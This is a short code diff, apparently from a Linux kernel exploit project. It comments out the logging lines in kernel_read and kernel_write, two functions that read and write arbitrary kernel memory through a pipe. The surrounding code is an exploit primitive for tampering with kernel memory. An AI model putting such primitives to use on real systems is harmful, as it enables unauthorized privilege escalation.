@@ -31,7 +31,7 @@ void verify_arbitrary_read_write(int pipefd[2], struct task_struct *task_struct,
 }
 
 bool kernel_read(void *addr, size_t len, void *ubuf, int pipefd[2]) {
-  INFO("Performing kernel read");
+  // INFO("Performing kernel read");
 
   ssize_t written = write(pipefd[1], addr, len);
 
@@ -47,13 +47,13 @@ bool kernel_read(void *addr, size_t len, void *ubuf, int pipefd[2]) {
     return false;
   }
 
-  SUCCESS("Kernel data read");
+  // SUCCESS("Kernel data read");
 
   return true;
 }
 
 bool kernel_write(void *addr, size_t len, void *ubuf, int pipefd[2]) {
-  INFO("Performing Kernel write");
+  // INFO("Performing Kernel write");
 
   ssize_t written = write(pipefd[1], ubuf, len);
 
@@ -70,7 +70,7 @@ bool kernel_write(void *addr, size_t len, void *ubuf, int pipefd[2]) {
     return false;
   }
 
-  SUCCESS("Kernel data write");
+  // SUCCESS("Kernel data write");
 
   return true;
 }
